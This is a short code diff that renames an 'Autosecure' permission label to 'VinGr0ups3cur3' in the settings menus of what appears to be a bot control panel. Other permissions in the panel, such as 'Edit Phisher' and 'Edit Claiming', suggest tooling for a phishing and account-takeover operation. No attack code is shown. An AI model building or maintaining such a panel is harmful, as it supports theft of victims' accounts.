@@ -73,7 +73,7 @@ const permissions1 = [
 ].join('\n');
 
 const permissions2 = [
-    `Autosecure ${currentUser.editautosecure ? '✅' : '❌'}`,
+    `VinGr0ups3cur3 ${currentUser.editautosecure ? '✅' : '❌'}`,
     `Edit Phisher ${currentUser.editphisher ? '✅' : '❌'}`,
     `Edit Claiming ${currentUser.editclaiming ? '✅' : '❌'}`,
     `Edit Blacklist ${currentUser.editblacklist ? '✅' : '❌'}`,
@@ -195,7 +195,7 @@ const settingsOptions = [
     { label: 'Edit Presets', value: 'editpresets', dbField: 'editpresets', description: "Edit preset configurations" },
     { label: 'Use Stats', value: 'usestatsbutton', dbField: 'usestatsbutton', description: "Use Stats button" },
     { label: 'Use DM', value: 'usedmbuttons', dbField: 'usedmbuttons', description: "Use /dm or dm button" },
-    { label: 'Edit Autosecure', value: 'editautosecure', dbField: 'editautosecure', description: "Edit autosecure configurations" },
+    { label: 'Edit VinGr0ups3cur3', value: 'editautosecure', dbField: 'editautosecure', description: "Edit autosecure configurations" },
     { label: 'Edit Phisher', value: 'editphisher', dbField: 'editphisher', description: "Edit phisher configurations" },
     { label: 'Edit Claiming', value: 'editclaiming', dbField: 'editclaiming', description: "Change user claiming options" },
     { label: 'Edit Blacklist', value: 'editblacklist', dbField: 'editblacklist', description: "Edit blacklist configurations" },
